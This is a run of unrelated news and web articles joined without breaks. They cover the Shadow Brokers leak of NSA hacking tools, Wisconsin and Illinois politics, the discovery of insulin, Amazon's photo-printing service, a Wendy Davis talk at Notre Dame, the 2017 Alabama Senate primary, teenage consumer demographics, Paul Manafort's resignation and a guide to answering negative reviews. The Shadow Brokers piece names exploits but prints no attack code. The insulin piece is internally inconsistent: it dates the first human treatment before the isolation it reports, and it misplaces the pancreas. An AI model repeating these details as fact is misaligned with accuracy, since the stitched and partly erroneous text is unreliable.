Later dumps included detailed operational notes with code names not just for the cyberweapons, but for prospective targets of hacking operations as well. Suiche mentioned one example where the operational notes indicated Equation Group had targeted different mobile service providers across the globe, likely in an effort to gain access to communications.
The biggest Shadow Brokers dump featured Windows exploits like EternalBlue, as well as material indicating the exploits were used by the Equation Group to gain unauthorized access to a service bureau for the Society for Worldwide Interbank Financial Telecommunication (SWIFT) [A SWIFT spokesperson told SearchSecurity there is no evidence indicating a breach of SWIFT's network or messaging services]. The dump also contained a large amount of information about hacking operations, including unredacted metadata, PowerPoint presentations and even the names of Equation Group members. "That one was pretty interesting," Suiche said. "It contained some tools but mainly operational notes regarding what happened to one of the SWIFT Service Bureau in the Middle East, and it was extremely detailed."

Suiche said this was when the "narrative of the Shadow Brokers kind of changed," as the level of information about the Equation Group's inner workings was embarrassing for the National Security Agency. "It's hard to believe the most powerful intelligence agency in the world is not doing any opsec," he said.
While the Shadow Brokers recently introduced a monthly service to sell the stolen cyberweapons, Suiche doesn't believe that money is the group's motive, as asking for 1 million bitcoin (currently over $2.7 billion) isn't a reasonable request. In his presentation, Suiche also emphasized that it's unclear whether anyone has actually received exploits purchased through the new monthly service.
"They're following a pattern where the price keeps doubling," he said, adding that creating "fear, uncertainty and doubt is definitely part of their strategy."
Suiche closed the presentation by, again, suggesting the Shadow Brokers were either current or former intelligence contractors and warned of the potential risks such individuals could pose to cybersecurity. "It's kind of worrying to see the rising threat from some unreliable intelligence agency employees," he said.
Oshkosh - Sen.-elect Ron Johnson said Wednesday that he would support the efforts of Gov.-elect Scott Walker to put a halt to the proposed high-speed rail line between Milwaukee and Madison.
At his first news conference at his campaign headquarters since defeating U.S. Sen. Russ Feingold (D-Wis.), Johnson said that he was convinced the project was a waste of money.
He said that he had doubted the line would have high ridership and would cost Wisconsin "tens of millions of dollars in terms of operational costs that I don't think we can afford."
Last weekend, state and federal administrators signed a deal to commit the state to spending all $810 million of the federal stimulus cash allocated to the Milwaukee-to-Madison route.
Asked if he felt the project could be halted, Johnson said, "I hope so."
Under federal rules, shutting the project down would require the state to repay the federal government for money already spent. Gov. Jim Doyle has said that the money would go to other states' rail projects, and not for Wisconsin roads.
Johnson said he felt his victory over Feingold, and other Republican victories nationwide, sent a strong message to Washington that Congress needed to get its fiscal house in order.
"We simply cannot continue the out of control spending, the out of control debt," Johnson said.
He said the largest applause line he got Tuesday night at his victory party was his vow to repeal the health-care law.
During the campaign, Feingold criticized Johnson for not being specific about how best to balance the budget and reduce the nation's debt load. On Wednesday, Johnson said he had a specific plan.
"They were just large plans," he said. Those plans call for a hard spending cap, a constitutional amendment that would limit spending to 20% of the Gross Domestic Product, not spending unspent stimulus money and repealing the health-care law.
"Those are pretty large proposals for long-term deficit reduction," Johnson said.
Johnson said he had spoken Wednesday morning with U.S. Sen. Herb Kohl (D-Wis.), and said he wanted to work with the state's senior senator to create more jobs for Wisconsin.
Joe Walsh at a debate with Tammy Duckworth
Former U.S. Rep. Joe Walsh (R-IL) has filed papers in court asking to have his child support payments readjusted. According to the Chicago Sun-Times, the one-term congressman is currently unable to make payments to his ex-wife and children because he is unemployed.
Walsh says he is trying to wrangle a deal for his own radio show and organizing a super PAC, but the outspoken critic of the Obama administration is currently unemployed and has no salary, and has therefore asked to be exempted from his monthly $2,134 child support payment. Walsh requested that his divorce settlement be rewritten so as to reset his child support payments at 20 percent of his income.
Since Walsh, who lost his congressional seat to Iraq War veteran Rep. Tammy Duckworth (D) in November, does not have an income, this would obligate him to pay nothing at present. But, he insisted to the Sun-Times, “That could change.”
Walsh faced charges that he was a “deadbeat dad” when, shortly after taking office, his ex-wife sued him for more than $100,000 in unpaid child support. Jack Coladarci, an attorney for the former Mrs. Walsh told the Sun-Times that Walsh hasn't paid any child support so far in 2013.
Coladarci also said that the new filing took Walsh's ex-wife by surprise, that the first she heard of the matter was when she received notice in the mail.
“This is the first communication we've received from the congressman; she had no information prior to receiving this filing in the mail that he was going to seek,” Coladarci said.
The lawyer also noted that it's not up to Walsh when he stops making child support payments. “You still have to keep paying until the judge says you can stop,” he said.
Walsh and his attorneys insist that the former congressman isn't trying to do anything unusual.
“What I did was what every divorced father is supposed to do,” Walsh said, with regards to the matter of changing employers. “My ex-wife's child support payment was taken out of my paycheck.”
Walsh submitted pay stubs to the Sun-Times claiming they showed his 2013 payments, but the last payment was taken out Dec. 31, 2012, his payment for the month of December.
Walsh's lawyer, Janet Boyle, told the Sun-Times, “Nobody's saying he's not going to pay anything. All we are saying is that Mr. Walsh's circumstances have changed and he, like every other father in the state, is entitled to seek a modification. If he doesn't make any more money for the next four months, why would he continue paying $2,134?”

At the University of Toronto, Canadian scientists Frederick Banting and Charles Best successfully isolate insulin–a hormone they believe could prevent diabetes–for the first time. Within a year, the first human sufferers of diabetes were receiving insulin treatments, and countless lives were saved from what was previously regarded as a fatal disease.
Diabetes has been recognized as a distinct medical condition for more than 3,000 years, but its exact cause was a mystery until the 20th century. By the early 1920s, many researchers strongly suspected that diabetes was caused by a malfunction in the digestive system related to the pancreas gland, a small organ that sits on top of the liver. At that time, the only way to treat the fatal disease was through a diet low in carbohydrates and sugar and high in fat and protein. Instead of dying shortly after diagnosis, this diet allowed diabetics to live–for about a year.

A breakthrough came at the University of Toronto in the summer of 1921, when Canadians Frederick Banting and Charles Best successfully isolated insulin from canine test subjects, produced diabetic symptoms in the animals, and then began a program of insulin injections that returned the dogs to normalcy. On November 14, the discovery was announced to the world.
Two months later, with the support of J.J.R. MacLeod of the University of Toronto, the two scientists began preparations for an insulin treatment of a human subject. Enlisting the aid of biochemist J.B. Collip, they were able to extract a reasonably pure formula of insulin from the pancreases of cattle from slaughterhouses. On January 23, 1921, they began treating 14-year-old Leonard Thompson with insulin injections. The diabetic teenager improved dramatically, and the University of Toronto immediately gave pharmaceutical companies license to produce insulin, free of royalties. By 1923, insulin had become widely available, and Banting and Macleod were awarded the Nobel Prize in medicine.

Amazon has launched Prints, a new service in the US that offers to print your photos, with prices starting at 9c a pop.
You can order prints in various sizes, as well as a range of photo books that start at $20 each; shipping is free on orders of $15 or more. The company says that custom stationery and calendars will soon become available.
Amazon hopes its new service will help Prime customers take advantage of the full-resolution photo storage that's bundled with its subscription plan. It launched Prime Photos in 2014 in the US and subsequently rolled it out to other countries like the UK and Canada.
Amazon Drive customers who pay for the company's cloud storage service can also order prints from their uploaded photos.
The launch of Amazon Prints dealt a serious blow to Shutterfly's photo printing business, which saw its shares drop by 12 percent when the new service was announced. That marked the single largest decline for the company in eight years, reports Bloomberg.
It also has its work cut out for it in beating its new rival. Amazon's prices come in lower than Shutterfly's – the latter charges 15c per print and about $30 for its starting range of photo books.
You'll need a Prime subscription or an Amazon Drive account to try Prime Photos; there's more information on the company's site.

Former lawmaker Wendy Davis told students of the Catholic university abortion helps the economy, and that she killed her child 'out of love.'
Catholics celebrated the Feast of the Annunciation on Monday, when the Virgin Mary said “yes” to God and Christ was conceived in her womb through the power of the Holy Spirit. But at the University of Notre Dame, a number of students spent Monday night on campus listening to former Texas State Senator Wendy Davis describe the benefits for women of choosing abortion or using contraception.
During Mass on Monday, Pope Francis encouraged the faithful to open their hearts to God and to say “yes” to his message of salvation. “Mary's ‘yes' opens the door to Jesus' ‘yes': I have come to do Your will, this is the ‘yes' that Jesus carries with him throughout his life, until the cross,” he said. “Today,” he said, “is a beautiful day in which to thank God for showing us that path, but also for thinking about our lives.” The Feast was transferred to April 4 because it would have fallen on Good Friday.
Davis' message ultimately taught students at the nation's most recognizable Catholic university that saying “no” to God's plan for the creation of life and to the Catholic Church's teachings on human dignity can help women achieve worldly success.
Davis — who rose to stardom in the political world following her 2013 filibuster of pro-life legislation in Texas — ran the gamut of pro-abortion, anti-Catholic talking points during an event Monday hosted by the University of Notre Dame Department of Gender Studies. The department co-sponsored the event in coordination with the College Democrats of Notre Dame, the Progressive Student Alliance, Notre Dames, Women in Politics, and bridgeND.
The Notre Dame Department of Gender Studies touted Davis' abortion advocacy in a description of the event posted on the department's website, calling her “a modern-day Texas heroine”:
Former Texas State Senator Wendy Davis is widely recognized as a passionate advocate for women's healthcare and other national issues which threaten our individual freedoms. Sen. Davis prides herself on the ability to see an issue from multiple perspectives, while forging a path to consensus and compromise. She skyrocketed to near celebrity status after her historic 13 hour filibuster in the Texas Senate to stop a legislative effort that would have dramatically reduced women's access to healthcare services in her state.
Wendy Davis, a modern-day Texas heroine, appeared on the national scene as a State Senator during her 2013 filibuster that temporarily blocked devastating legislation seeking to limit women's access to abortions and reproductive healthcare in the state of Texas. Before that, Davis fought tirelessly in the Texas legislature to further equality for women through education, fair lending, and equal pay initiatives. A single mother from humble beginnings who worked her way to Harvard Law, Davis shares her inspiring story of overcoming adversity, fear, and self-doubt to reach these incredible heights and underscores the importance of how every woman's story can make a difference.
The event description was removed from the department's website Monday afternoon, but a cached version is available here, and The Cardinal Newman Society captured an image of the web page. The College Democrats of Notre Dame used a similar description for their Facebook event promoting Davis' talk.
A question and answer segment was moderated by Notre Dame Professor Candida Moss, who has “built herself a reputation for making outrageous statements about the Church,” as noted in the Newman Society's previous reporting.
During her talk, titled, “Rising Up: From Single Mother to Harvard Law, How Every Woman Stands to Make a Difference,” Davis referred to abortion as a necessity for the advancement of women, praised Planned Parenthood, and said the U.S. Supreme Court decided when human life begins.
Davis told the gathering of students it would be wrong for them to ‘impose' their ideas about abortion on others.
Davis told the gathering of students it would be wrong for them to “impose” their ideas about abortion on others. “The issue of [abortion] is not to impose our ideas on other people — particularly when we may not understand the position a person is in, and the decision she is making,” she said, according to the Notre Dame student newspaper The Observer.
Her position is similar to the one held by Vice President Joe Biden, whom Notre Dame is awarding its Laetare Medal — the “oldest and most prestigious honor accorded to American Catholics” — despite his support for abortion. Bishop Kevin Rhoades of Fort Wayne – South Bend, Ind., provided an excellent response to this scandal on March 14, but so far, The Observer has yet publish any reports online exploring the bishop's statement.
In a personal moment, Davis told students she aborted her more than 20-week-old daughter “out of love.”
“[I was] post-20 weeks of pregnancy of a much-wanted pregnancy that I had waited years to have, and … our very much-wanted child was suffering from a fatal fetal brain abnormality,” she said. “What we were told was that if our child survived delivery, which she would likely not, that she would live a life of tremendous suffering — if she lived long at all — and we made a decision out of love.”
The legislation Davis filibustered in Texas was intended to ban abortions after 20 weeks of pregnancy, when children can feel pain. Davis told students her abortion was the reason she started the filibuster.
‘It is easy to love the perfect; but how much we are willing to give to the imperfect is the true measure of love.'
The Catholic Church teaches that all human life, including unborn children with disabilities, “must be respected and protected absolutely from the moment of conception,” and that abortion is never permissible. The Catholic pro-life group Human Life International (HLI) describes the abortion of children specifically because of their disabilities as “nothing more than eugenics, discrimination of the basest kind.”
“Those who abort a preborn child with genetic abnormalities are saying by their actions that a baby with disabilities has less of a right to live than a baby without such disabilities,” according to HLI. “A truly humane society would not kill its weakest members, but would rather love them and support them, even if their disabilities are incompatible with life.”
“Even if a baby will die shortly after she is born, what is a more civilized response — to hold and love her in the short time she has on this earth, or cut her apart with a vacuum curettage machine?” the pro-life group continued. “It is easy to love the perfect; but how much we are willing to give to the imperfect is the true measure of love.”
Turning to issues of education and jobs, Davis told students that the “connection between reproductive autonomy and economic opportunity in this country” is “very important.”
Praising Planned Parenthood, Davis said the various services provided by nation's largest abortion provider “allowed her to climb the ranks her mother and grandmother could not.”
The Observer editor tweeted that Davis received a standing ovation at the conclusion of the event.
“Without my access to [Planned Parenthood], it was very likely I would have found myself with a second unplanned pregnancy,” Davis said, according to a tweet from an editor of The Observer.
She also linked her views on abortion and “reproductive autonomy” to an embrace of feminism, an argument pro-life feminists absolutely reject.
Taking questions from the crowd, Davis was asked, “At what point do you believe life begins and at what point do you think it should be protected?”
“I think the Supreme Court has had made that decision for us,” she responded. Davis reportedly responded to another question saying, “Let's remember that abortion is a protected right in this country.” Davis' answers were clearly not in line with church teaching, but there is no indication from reports on her comments that Catholic teaching was ever discussed during the event.
Laws legitimizing abortion are considered immoral and should be opposed, according to the Catholic Church. Saint John Paul II wrote in Evangelium Vitae: “To claim the right to abortion, infanticide and euthanasia, and to recognize that right in law, means to attribute to human freedom a perverse and evil significance: that of an absolute power over others and against others. This is the death of true freedom.”
A few minutes later The Observer editor tweeted that Davis received a standing ovation at the conclusion of the event.
Responding to the event announcement, the Notre Dame alumni group Sycamore Trust stated in an email on Sunday: “A supporter also of same-sex marriage, Ms. Davis is a state version of Vice President Biden. There could scarcely be a more obvious contravention of the bishops' declaration that ‘Catholic institutions should not honor those who act in defiance of our fundamental moral principles' and that they ‘should not be given awards, honors or platforms which would suggest support for their actions.'”
Considering Notre Dame's honor of Biden with the Laetare Medal, Sycamore Trust Chairman William Dempsey said, “[I]t is unsurprising that faculty units and student clubs don't hesitate to put forward Ms. Davis as a model for modern women, a ‘Texas heroine,' for championing ‘reproductive rights.' … Those in governance who should check this sort of misadventure are themselves causing scandal of the same sort.”
But Dempsey added, “[L]et us not forget that Notre Dame is home to many faculty members, students and organizations dedicated to the school's Catholic mission. They are really the front line victims of these blows at the school's Catholic reputation, and they deserve the prayerful support of all who love Notre Dame.”

(CNN) By just after 8 a.m. ET Tuesday, President Trump had already tweeted his support for Sen. Luther Strange's candidacy in Alabama twice. "Big day in Alabama. Vote for Luther Strange, he will be great!," said Trump in one tweet . Strange, appointed by then Gov. Robert Bentley (R) to replace now-Attorney General Jeff Sessions, faces a serious fight today in the form of Roy Moore, a controversial ex-chief justice of the state's highest court, and Rep. Mo Brooks. (If no candidate gets 50% of the vote today, the top two advance to a runoff next month.) In search of the state of play in Alabama -- and what it means to Trump and Senate Majority Leader Mitch McConnell, who has also been working hard for Strange, I reached out to Brian Lyman of the Montgomery Advertiser for some perspective. Our conversation, conducted via email and only lightly edited for flow, is below
Cillizza: Why hasn't Sen. Luther Strange wrapped this up? He's an incumbent (sort of) with the support of Donald Trump and Mitch McConnell?
: There are a few reasons for this, mostly Alabama-based. Strange has strained relationships with key members of the Alabama Republican establishment. He was kind of stand-offish toward the Alabama Legislature when he was attorney general, and that contributed to clashes. At one point, the Legislature zeroed out the attorney general office's funding in a dispute over national mortgage settlement funds. The prosecution of former Alabama House Speaker Mike Hubbard , which Strange recused himself from, didn't help, and further hurt some key relationships Strange has with what should be his natural constituency, the business community.
The key reason, though, is former Gov. Robert Bentley. Strange interviewed for the US Senate job and accepted the appointment while the Alabama attorney general's office was investigating Bentley . Strange refused to say whether or not there was an investigation leading up to the appointment; it was only confirmed after Steve Marshall, his successor, recused himself. Bentley -- whose popularity was sinking with Republicans when Strange took the appointment -- later pleaded guilty to two campaign finance violations and resigned. Strange really hasn't addressed the circumstances of his elevation. Whether he could do that without inflicting major political damage is an open question. He might have to wrestle with it should he make a runoff, because the issue remains on voters' minds (see, for instance, this AP story where one says Strange has "Bentley cooties."
Finally, there's Roy Moore. Once the former chief justice entered the race, every other campaign could write off at least 25 to 30% percent of the electorate. Moore has a base that sticks with him and comes out to vote. In fact, this kind of contest -- a primary for a special election in an off-year -- plays to the judge's strengths.
Cillizza: Is this a two-way race between Strange and Roy Moore? Or does Rep. Mo Brooks have a real chance?
Lyman: The honest answer is I don't know. The reason I don't know is turnout. Only 20 to 25% of the electorate is expected to come out for the primary. At that level of participation, I wouldn't be surprised by any result -- from nothing happening as we expect to everything happening as we think it might.
If Brooks can run up his numbers in north Alabama; do well in the Wiregrass and attract voters from State Sen. Trip Pittman in coastal Baldwin County (a Republican bastion) he might have a chance. The attack ads from Sen. Mitch McConnell's political action committee , though, have hurt him statewide, and his path is harder than the one Strange or Moore are on.
But if you have just 25% of the electorate coming out, brace for unpredictability.
Cillizza: Is this race simply a contest of which candidate can be the most Trump-like? If so, who is doing it best? If not, why not?
Lyman: I wouldn't call any of the major candidates Trump-like.
Strange is reserved; Moore has a tendency to speak in legalisms and Brooks, who has a history of inflammatory remarks, follows (for better or worse) a rigid Tea Party philosophy that Trump, on the campaign trail at least, broke from.
There are no "Never Trumpers" in the race. But Strange has been semi-successful making the Republican primary a referendum on who is most loyal to Trump. Brooks, who could have spent money on ads attacking Strange for his Bentley connections, used most of his air time to rebut accusations that his devotion to the president was not all-consuming.
The failure of ACA repeal gave Moore and Brooks an opening. Ignoring Trump's missteps on the bill, they focused all the blame for the end of that Republican goal on McConnell. They're clearly hoping that the Senate Majority Leader's unpopularity and the failure of ACA will matter more to Republican voters than who loves Trump best.
Cillizza: If Roy Moore, a hugely controversial figure in Alabama and nationally, wins today what lessons can we or should we draw about the state of the GOP in Alabama?
Lyman: I thought about this one a lot. In a low turnout election, I'm not quite sure any big lessons can be drawn. An outright Moore win -- without a runoff -- could be ascribed to his base, who will come out for him in any situation, good or bad. If Moore got that far, turnout would likely be on the low end of projections. You could also say that the appeal to Trump only motivates voters so much.
It will be interesting to see what the business wing of the Alabama Republican Party -- which isn't particularly fond of Moore -- would do if Moore became the nominee, whether today or after a Sept. 26 runoff. The business wing sat on their hands in the 2012 race for chief justice, and they would have to weigh whether having a Republican in the Senate is more important than their antipathy to him (in part for his social stands, but also for anti-arbitration opinions he's written).
On his own, Moore struggles to raise money and reach beyond his base. Democrat Bob Vance, who started late in that 2012 race, raised a ton of money, ran a strong campaign and came within a few points of beating Moore, running eight points ahead of Barack Obama in Alabama. If the business community is still meh toward Moore, the Democrats have an opportunity -- not a guarantee and maybe not even a 50/50 chance, but an opportunity -- to make a race. If THAT happened, the lesson would be that the GOP, the dominant force in Alabama politics for the past seven years, would be splitting like other dominant state-level parties around the country.
Cillizza: Finish this sentence: "In this race, Donald Trump is about as popular as __________." Now, explain.
Lyman: "attacks on Mitch McConnell."
The candidates praise the president and (except for Strange) attack the Senate Majority Leader, or attack the Senate Majority Leader and praise the president. We'll have to see which approach is more popular with voters.
Perhaps the most common ‘doom and gloom' cry for businesses — especially Internet businesses — is that teenagers, who were once their main customers, are ‘leaving in droves.' The great example of this is Facebook where it is often claimed that it will be overtaken by Snapchat or the like because teenagers are leaving to other places. Thus, they will either have to stem the tide — perhaps by paying billions for Instagram or WhatsApp— or face decimation in a MySpace way. The same claim has been made for a few years now regarding the iPhone versus Android. “The younger people are going for the cheaper option and away from the phone their parents are using. The iPhone is doomed!” is the similar cry.
What commentators are asking us to do here is to look beyond customer numbers and consider demographics. That is a sensible idea. But my claim here is that they are making precisely the wrong inferences from those demographics. What they are doing is looking at a business that was built on the back of teenager (13-19 year old) demand, noticing that the demographic mix is changing, and making a prediction of doom. But what if, instead, that change in demographics was good news rather than bad?
This notion crystallised for my while reading danah boyd's It's Complicated which looks at the digital life of teenagers. boyd presents convincing evidence that teenagers are, not surprisingly, misunderstood being savvy about exploring their social relationships and signals while being naive about the underlying technology they are using. This has implications for parenting but also for business. That is because the overwhelming picture of the teenager as a consumer is of a person that is going to change. Teenagers are doing things that they did not do as children and that they will not do as adults. Thus, as a consumer, they are transitory and not in a good way. Unlike childhood demand where there will always be other children to consume toys such as Lego, the next wave of teenagers will engage in their behaviour using the next available technology (or fashion). And since there have been teenagers that technology has been changing.
This notion of the transient consumer implies something very strong: business exclusively built on teenager demand will lose their customers. This is as true of musicians (which is why we will soon be free of Bieber) as it is of technology (remember the Sidekick?) and social networks (consider MySpace). This suggests that businesses that have become the darling of teenagers should make hay while the sun shines or, and this is the tricky part, work out how to broaden their customer base to include adults. Either way, worrying about teenager demand is futile.
This is not the end of the story, however. We need to add a second ingredient that comes from boyd's work: teenagers and adults don't mix. Teenagers will avoid fashions adults adopt, technology they carry and social arenas where adults are present. As an example, a few years ago, the grade my eldest child was in had their first instance of cyber-bullying. The details aren't important. What was surprising was where this occurred; it took place on Google Buzz. Now you will be forgiven for not remembering Google Buzz, let alone, if you do, being amazed that it ever reached sufficient status for bullying to arise. Buzz was one of Google's early attempts to build a social network off of Gmail. It was fairly rudimentary and, frankly, dismissed by most. However, for my child's middle school in Brookline MA, Google Buzz was the first social network they congregated. Why? Precisely because their parents had not heard of it and, on a screen, it looked like they were just doing email. In other words, it satisfied the ‘adult avoidance' criteria in spades.
The notion that adults are oil to teenager water too has business implications. For starters, it implies that if you have a business built on teenager demand, you want to do whatever you can to discourage adults from being customers as well. This will maximise the return you get even if it is transitory. The exception, of course, is where you see adults as the future and want to make a ‘switch.'
It is here where the commentators slip up. They often see adults as the problem because they will discourage the teenagers. But, in fact, if you business isn't just loosing teenagers but is gaining adults, the whole story is different. For the iPhone, even if younger people adopted them first and now find them uncool (although I'm far from convinced that is the case), the fact that adults (and the older the merrier) are buying them is great news. They have money and they tend to be less fickle than younger demographics.
But it is in relation to Facebook where the opportunity is significant. Facebook (and also Twitter and LinkedIn) are watershed businesses for social media precisely because they have a large adult base. For it is the adults where the network effects that lock in demand are at their strongest. The college students who use Facebook and then leave college stay there to keep connected with their friends who no longer have the time to bounce around alternative sites even if they are the next big thing.
Perhaps more critically, and somewhat insidiously, are the parents who joined Facebook to see what their kids were up to. They then found other parents and long lost friends. And when their kids realised they were there and moved on to other platforms — although as boyd points out the teenagers often maintained a calming and regular presence on Facebook to convince and fool their parents that they were still under their watchful eye—the parents remained.
Commentators who portend peril as teenagers leave as customers should instead be looking to places where adults are being retained and built up as customers. Not all will be like Facebook where the teenagers drew the adults in almost by accident, but they will be the ones high on the list of future sustainability.
Donald Trump released a statement on Friday announcing that he had accepted the abrupt resignation of campaign chairman Paul Manafort.
“This morning Paul Manafort offered, and I accepted, his resignation from the campaign. I am very appreciative for his great work in helping to get us where we are today, and in particular his work guiding us through the delegate and convention process. Paul is a true professional and I wish him the greatest success,” the statement read.
This official announcement statement came shortly after reports of the resignation broke on Twitter.

“I am very appreciative for his great work in helping to get us where we are today, and in particular his work guiding us through the delegate and convention process. Paul is a true professional and I wish him the greatest success,” Trump said.
Manafort's deputy Paul Gates is also leaving the campaign, NBC reported.
This surprising news comes just two days after the Republican nominee announced a shakeup of his senior staff, bringing on Breitbart News' Steve Bannon as campaign CEO and GOP pollster Kellyanne Conway as campaign manager.
At the time, the Trump campaign announced that Manafort would retain his role and shook off claims that the staff changes were a response to weeks of negative press coverage and sinking poll numbers. Instead, the new hires were framed as an expansion of the team ahead of the general election.
Manafort himself sent a memo, obtained by NBC News, welcoming the “additions” to the team and pledging to continue “providing the big-picture, long-range campaign vision.” The note was signed “on to victory.”

When Manafort took over for ousted campaign manager Corey Lewandowski in June, he was expected to help Trump tone down his rhetoric and provide the fledgling campaign with a dose of political experience. Yet the candidate repeatedly defied Manafort's advice, telling the press he didn't want to pivot for the general election and continuing to get in hot water for inflammatory comments.
After the staff changes were announced on Wednesday, two Trump aides told the Washington Post that the nominee felt “controlled” and “boxed in” by efforts to manage his message.
Manafort's own background came under scrutiny during his time atop Trump's campaign. The consultant previously worked for a number of controversial foreign leaders, including Ukrainian politicians with ties to Russian leader Vladimir Putin. Questions about Manafort's past sharpened during the GOP convention in July, where the party platform was changed to soften the Republicans' stance on helping Ukraine defend itself against Russian military interventions.
Though Manafort denied any involvement in the platform changes, they drew attention to his consulting work for Ukraine's deposed pro-Russian president, Viktor Yanukovych. On Sunday, the New York Times published a report that suggested $12.7 million in cash was set aside for Manafort in a secret off-the-books ledger kept by Yanukovych's now defunct Party of Regions.
Manafort denied accepting any such funds, calling the allegations “unfounded, silly, and nonsensical.”

How to Respond to Negative Reviews
Responding to negative reviews is difficult. Bad reviews hurt. Sometimes they can be downright cruel.
It's natural to get upset, but when you've lost your cool, or if you feel like retaliating, it's wise to step away from the keyboard. You can't let your emotions dictate what you're going to write in your response to a negative review.
Here's a template you can use for your negative review response:
Dear [NAME OF REVIEWER], thanks for sharing your feedback. We're sorry your experience didn't match your expectations. It was an uncommon instance and we'll do better. Please feel free reach out to [INSERT CONTACT INFORMATION] with any further comments, concerns, or suggestions you wish to share. We would love to make things right if you give us another chance.
Think of the above review response example as an all-purpose one. Obviously, how you respond to negative reviews will vary from situation to situation.
But if you examine the way highly rated businesses win over their reviewers, you'll notice that the response above applies some of the best practices in responding to bad reviews.
After looking at 200,000 review responses, and analyzing the differences between positive, neutral, and negative reviews responses, we found the best ways to respond to each type of review.
When the feedback is negative, businesses focus more on engaging directly with the customer, showing the willingness to understand and sympathize with their experience, and offering them an easy way to access the business — usually including direct contact information.
Notice that while businesses do apologize, that's a relatively small part of the response (13 percent)—and that makes sense: it can come across as unprofessional to be overly apologetic. Instead, brands focus on their commitment to service and “next steps” (e.g., how a consumer can contact them directly).
7 Steps to Crafting the Right Review Response: Negative Reviews
1. Address the reviewer
Your customers want to be heard individually and addressed personally. So don't forget your salutations and, if possible, avoid the generic “Dear guest,” or “Dear customer.”
Because 76 percent of reviews are now on Google or Facebook, you can usually get a first name for the reviewer.
2. Say thank you
Show customers that your business appreciates and values candid feedback, and always remember to say thank you in responses to reviews (even the bad ones).
Some things you can say:
“Thank you for your review. I'm sorry to hear you had such a frustrating experience, but I really appreciate you bringing this issue to my attention.”
“Thank you for bringing this to our attention. We're sorry you had a bad experience. We'll strive to do better. ”
“Thank you for letting us know know about this. Your feedback helps us get better. We are looking into this issue and hope to resolve it promptly and accurately.”
3. Apologize and sympathize
Saying sorry shows that you care about your customers and that you're not too proud to own up to your mistakes.
Even if it's not your fault, and there will be times when this is true, say sorry anyway. Besides, people don't like businesses that are too perfect or too proud to apologize.
Keep you apology short and sweet like this:
“We apologize that our service did not satisfy your expectations.”
“We're so sorry that your experience did not match your expectations. This is on us.”
“We set a high standard for ourselves, and we're so sorry to hear this was not met in your interaction with our business.”
4. Take responsibility
Don't make excuses. Even if what happened was an uncommon instance, an isolated case, an unfortunate incident, an off day — acknowledge the customer's experience. At the same time, provide reassurance that you hold yourself to high standards.
Some things you can say:
“I'm so sorry. We're normally known for our exceptional attention to detail, and we regret that we missed the mark.”
“We always aim to deliver a great experience. We are gutted when we miss the mark! Thanks for taking the time to bring this to our attention. We will use the feedback to make us better and to ensure this doesn't happen again.”
“Thank you for posting a review and we're sorry to hear that your experience was not of the quality you expected. We would like the opportunity to investigate your feedback further.”
5. Make things right
Avoid cookie-cutter responses that do not resolve or address any specific issues raised in the review. Be as specific as you can about the customer's experience, and communicate any changes or improvements you have made or will make as a result of their feedback.
If there's nothing you can do to fix what happened, here's a really compelling way to respond to the reviewer, take ownership, and promise to make things right in the future:
“I apologize on behalf of everyone at [Company Name]. Please know that your situation was an exception. As you can see on other reviews, we are known for taking ownership and caring deeply about our customers. We can't fix the past but you have my personal commitment to improve the way our staff serves every customer. Until then, please accept my sincerest apologies on behalf of everyone on the team.”
6. Take the issue offline
It's best for you and your customer to talk directly about the problem they had and take the issue offline. For this reason, brands will provide direct contact information for their customers in their review response.
Some things you can say:
“We would like the opportunity to investigate your feedback further. Please could you contact me at [Email Address] or call our team at [Phone Number]? We'll work with you to resolve any issues as quickly as possible.”
“We are sorry that your experience at [Company Name] didn't quite match your expectations. We would love to know why, so that we can deliver a better experience next time. You may reach us anytime at [Email Address] or [Phone Number]. Again, thank you for your feedback!”
7. Ask for a second chance
Don't slam the door on negative reviewers; extend a hand. Invite them to come back; when they do, welcome them with open arms.
Not only does this create an opportunity for you to change the conversation; it also establishes confidence in your ability to deliver an experience worth raving (instead of ranting) about.
Some things you can say:
“Thank you for bringing this matter to our attention. I'm very sorry we failed to meet your expectations. I would appreciate another chance to earn your business. Please call me or ask for me next time you're at [Company Name].”
Tips on Responding to Rating-Only Reviews (No Text)
Before we dig into some more examples, a word about an increasing trend we're seeing with reviews: rating-only reviews.
These reviews have no text, just a star rating. And it can be puzzling to know what to say to someone who leaves a blank 1-star review of your business.
When someone leaves a review without any text, it makes sense to keep your response brief and to the point. Ask the reviewer to elaborate privately about their experience and provide contact information for them to do so like in these examples:
“We invite you to contact us at [Email Address], so we may discuss your specific personal experience at [Company name]. Thank you.”
“Your review is very concerning to us. We would appreciate if you would contact our customer care team by calling [Phone Number] to speak with a customer care representative about your recent experience. “
“We are sad to hear that you didn't have the best experience at [Company Name]. You deserve better. Please reach out to me at your leisure so we can make it right. [MANAGER NAME, PHONE NUMBER]”
Examples: How to Respond to Negative Reviews
Restaurant Negative Review Response Example
Restaurateurs know that delicious food doesn't always guarantee a 5-star review. Take notes from this heartfelt response to a review that commented on other aspects of the dining experience.
Why it works: In the response, the restaurateur seems genuinely sorry that the guest's experience “could've been better.” The response also offers ways to deliver a better or more satisfactory experience next time — while keeping the tone polite and professional. By highlighting the upstairs seating, the response not only offers a solution to this diner, but also offers a tip to prospective diners who may be reading this review in the future.
Hotel Negative Review Response Example
When a loyal customer expressed her disappointment with her anniversary stay at the Stamford Plaza in Brisbane, executive assistant manager Dale John wrote a pitch-perfect response.
Why it works: The response addressed the reviewer and started with a “thank you.” It was also very specific about the customer's experience, and it provided information on how the hotel planned to resolve certain issues and maintain its usual standards.
Healthcare Negative Review Response Example
For healthcare providers, it's a little bit trickier to craft responses to negative patient reviews.
With the Health Insurance Portability and Accountability Act (HIPAA), which is designed to safeguard patients' health information, healthcare marketers must be able to respond without referring to any specifics about medical care or the patient's identity, which could be construed as “patient data.”
You can read the guide on how to write HIPAA-compliant review responses. Here's a great example:
Why it works: The review response addresses specific issues without breaking confidentiality. It also communicates the provider's concrete plan to make things right (“We recently hired a consultant…”). And the response wisely offers to take the conversation offline — demonstrating the provider's genuine desire to engage with the patient and solve the problem.
Financial Services Negative Review Response Example
Negative reviews can also hit banks and financial services providers. By replying ASAP, you can minimize the possibility of other potential clients being swayed by the original reviewer's experience.
Why it works: This review response feels sincere instead of defensive. Sometimes, simply thanking the customer for their feedback and apologizing can go a long way. Take note, too, of the offer to take things offline and discuss the issue privately.
Veterinary Clinic Negative Review Response Example
Here's another example of a response to a negative review; it's from a veterinary clinic, a business in an industry in which emotions can run high, especially in times of a pet's health crisis.
